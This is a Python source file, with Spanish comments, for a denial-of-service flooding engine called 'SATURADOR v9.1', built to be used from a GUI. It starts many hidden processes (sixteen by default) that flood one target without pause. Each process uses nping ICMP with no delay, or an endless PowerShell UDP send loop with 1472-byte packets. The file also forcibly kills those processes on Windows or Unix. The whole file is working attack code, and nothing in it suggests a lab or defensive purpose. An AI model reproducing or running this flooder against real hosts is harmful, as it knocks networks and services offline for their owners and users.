"""
core/flood.py
-------------
Puerto directo de la logica de tu SATURADOR v9.1 a una clase
reutilizable desde la GUI.

  - Usa nping si esta disponible (ICMP puro, mas agresivo).
  - Fallback: clientes UDP de PowerShell (sin dependencias externas).
  - Parada INSTANTANEA via TerminateProcess (API de Windows), sin
    abrir un segundo proceso ni esperar al taskkill.
"""
from __future__ import annotations

import ctypes
import os
import platform
import signal
import threading
import time

from . import proc

IS_WIN = platform.system() == "Windows"
PROCESS_TERMINATE = 0x0001

DEFAULT_POWER = 16
DEFAULT_PAYLOAD = 1472


def udp_flood_cmd(target: str, port: int, payload: int) -> list[str]:
    """Cliente UDP de PowerShell enviando en bucle infinito."""
    script = (
        "$u=New-Object System.Net.Sockets.UdpClient;"
        f"$u.Connect('{target}',{port});"
        f"$b=New-Object byte[] {payload};"
        "$u.Send($b,$b.Length);"
        "while($true){$u.Send($b,$b.Length)}"
    )
    return ["powershell", "-NoProfile", "-NonInteractive", "-Command", script]


def flood_cmd(target: str, index: int, payload: int) -> list[str]:
    """nping si existe; si no, UDP de PowerShell."""
    if proc.which("nping"):
        return ["nping", "--icmp", "--data-length", str(payload),
                "--delay", "0", "-c", "0", "-H", "-N", target]
    return udp_flood_cmd(target, 40000 + index, payload)


def _kill_pid(pid: int) -> bool:
    """Terminacion instantanea a nivel de API."""
    if IS_WIN:
        try:
            h = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                ctypes.windll.kernel32.TerminateProcess(h, 0)
                ctypes.windll.kernel32.CloseHandle(h)
                return True
        except Exception:
            return False
        return False
    try:
        os.killpg(os.getpgid(pid), signal.SIGKILL)
        return True
    except Exception:
        try:
            os.kill(pid, signal.SIGKILL)
            return True
        except Exception:
            return False


class FloodEngine:
    """Lanza y controla N procesos de inyeccion contra un objetivo."""

    def __init__(self, log=None):
        self.log = log or (lambda m, l="info": None)
        self.power = DEFAULT_POWER
        self.payload = DEFAULT_PAYLOAD
        self._procs: dict[int, object] = {}
        self._lock = threading.Lock()
        self.target: str | None = None
        self.started_at: float = 0.0

    # -------------------------------------------------- estado
    @property
    def alive(self) -> int:
        with self._lock:
            return sum(1 for p in self._procs.values() if p.poll() is None)

    @property
    def running(self) -> bool:
        return self.alive > 0

    @property
    def uptime(self) -> float:
        return time.time() - self.started_at if self.running else 0.0

    def mode_label(self) -> str:
        return "nping (ICMP)" if proc.which("nping") else "PowerShell UDP"

    # -------------------------------------------------- control
    def start(self, target: str, power: int | None = None,
              payload: int | None = None) -> int:
        self.stop(silent=True)
        self.power = power or self.power
        self.payload = payload or self.payload
        self.target = target

        started = 0
        with self._lock:
            self._procs.clear()
            for i in range(self.power):
                try:
                    p = proc.popen_hidden(flood_cmd(target, i, self.payload))
                    self._procs[i] = p
                    started += 1
                except Exception as exc:
                    self.log(f"Fallo al lanzar proceso {i}: {exc}", "warn")

        time.sleep(0.4)
        self.started_at = time.time()
        alive = self.alive

        if alive == 0:
            self.log(f"No arranco ningun proceso contra {target}", "error")
        else:
            self.log(
                f"INYECTANDO {target} -> {alive}/{started} procesos de "
                f"{self.payload} bytes [{self.mode_label()}]", "ok"
            )
        return alive

    def stop(self, silent: bool = False) -> int:
        with self._lock:
            pids = [p.pid for p in self._procs.values()]
            n = sum(1 for p in self._procs.values() if p.poll() is None)
            self._procs.clear()

        for pid in pids:
            _kill_pid(pid)

        # Barrido de restos huerfanos
        if IS_WIN and proc.which("nping"):
            proc.run_hidden(["taskkill", "/F", "/IM", "nping.exe"], timeout=6)

        if not silent and n:
            self.log(f"Detenido. {n} proceso(s) terminado(s).", "warn")
        return n